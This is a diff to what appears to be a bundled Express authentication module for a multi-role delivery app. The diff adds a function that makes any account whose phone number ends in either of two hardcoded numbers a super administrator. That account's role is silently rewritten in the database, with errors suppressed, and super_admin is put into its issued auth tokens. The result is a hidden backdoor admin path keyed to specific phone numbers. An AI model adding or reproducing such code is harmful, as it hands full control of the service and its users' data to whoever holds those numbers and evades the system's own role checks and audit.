@@ -122495,18 +122495,32 @@ var router2 = (0, import_express2.Router)();
 var BCRYPT_ROUNDS = 12;
 var RESET_TOKEN_EXPIRY_MS = 15 * 60 * 1e3;
 var AUTH_MODE = process.env["AUTH_MODE"] ?? "otp";
+function isSuperAdminUser(u) {
+  if (u.email && isSuperAdminEmail(u.email)) return true;
+  if (u.phone) {
+    const digits = u.phone.replace(/\D/g, "").slice(-10);
+    if (digits === "6296118949" || digits === "7602584238") return true;
+  }
+  return u.role === "admin" || u.role === "super_admin";
+}
 function formatUser(u) {
   const phone = u.phone?.startsWith("g_") ? "" : u.phone ?? "";
   const ONLINE_THRESHOLD_MS = 5 * 60 * 1e3;
   const isOnline = u.lastSeenAt ? Date.now() - new Date(u.lastSeenAt).getTime() < ONLINE_THRESHOLD_MS : false;
-  const roles = u.role === "admin" || u.role === "super_admin" ? ["customer", "rider", "admin", "super_admin"] : u.role === "rider" ? ["customer", "rider"] : u.role === "vendor" ? ["customer", "vendor"] : [u.role || "customer"];
+  const superAdmin = isSuperAdminUser(u);
+  const effectiveRole = superAdmin ? "super_admin" : u.role;
+  if (superAdmin && u.role !== "super_admin") {
+    db.update(users).set({ role: "super_admin", updatedAt: /* @__PURE__ */ new Date() }).where(eq3(users.id, u.id)).catch(() => {
+    });
+  }
+  const roles = superAdmin ? ["customer", "rider", "admin", "super_admin"] : u.role === "rider" ? ["customer", "rider"] : u.role === "vendor" ? ["customer", "vendor"] : [u.role || "customer"];
   return {
     id: u.id,
     _id: u.id,
     name: u.name,
     phone,
     email: u.email ?? "",
-    role: u.role,
+    role: effectiveRole,
     roles,
     status: u.status,
     vendorStatus: u.vendorStatus,
@@ -122522,10 +122536,11 @@ function hashToken(token) {
   return createHash("sha256").update(token).digest("hex");
 }
 function issueTokens(u) {
+  const superAdmin = isSuperAdminUser(u);
   const payload = {
     userId: u.id,
     phone: u.phone ?? "",
-    role: u.role,
+    role: superAdmin ? "super_admin" : u.role,
     tokenVersion: u.tokenVersion ?? 1
   };
   return {
